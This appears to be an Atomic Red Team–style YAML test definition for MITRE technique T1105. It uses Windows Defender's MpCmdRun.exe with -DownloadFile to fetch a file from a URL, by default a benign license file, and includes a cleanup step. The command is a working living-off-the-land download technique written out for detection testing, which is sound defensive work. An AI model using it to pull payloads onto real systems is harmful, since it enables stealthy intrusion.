api_version: "2.0"
name: Download a File with Windows Defender MpCmdRun.exe
description: |
    Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
    The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
    By default, the test downloads the Atomic Red Team license file to the temp directory.

    More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
args:
    - name: remote_file
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    - name: local_path
      type: path
      default: '%temp%\Atomic-license.txt'
uuid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: download-a-file-with-windows-defender-mpcmdrun.exe
      inline: |
        cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
        MpCmdRun.exe -DownloadFile -url {{.Args.remote_file}} -path {{.Args.local_path}}
      executor: command_prompt
      cleanup:
        inline: |-
            del {{.Args.local_path}} >nul 2>&1
            del %temp%\MpCmdRun.log >nul 2>&1
        executor: command_prompt
